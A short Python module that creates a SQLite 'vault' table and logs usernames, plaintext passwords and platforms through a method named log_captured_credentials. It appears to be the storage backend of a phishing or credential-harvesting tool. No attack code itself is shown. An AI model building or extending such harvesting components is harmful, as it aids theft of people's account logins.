import sqlite3
import os

class FsocietyDatabase:
    @staticmethod
    def initialize_vault():
        os.makedirs("db", exist_ok=True)
        conn = sqlite3.connect("db/fsociety_vault.db")
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vault (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                platform TEXT NOT NULL
            );
        """)
        conn.commit()
        conn.close()

    @staticmethod
    def log_captured_credentials(username, password, platform):
        conn = sqlite3.connect("db/fsociety_vault.db")
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO vault (username, password, platform) VALUES (?, ?, ?);",
            (username, password, platform)
        )
        conn.commit()
        conn.close()
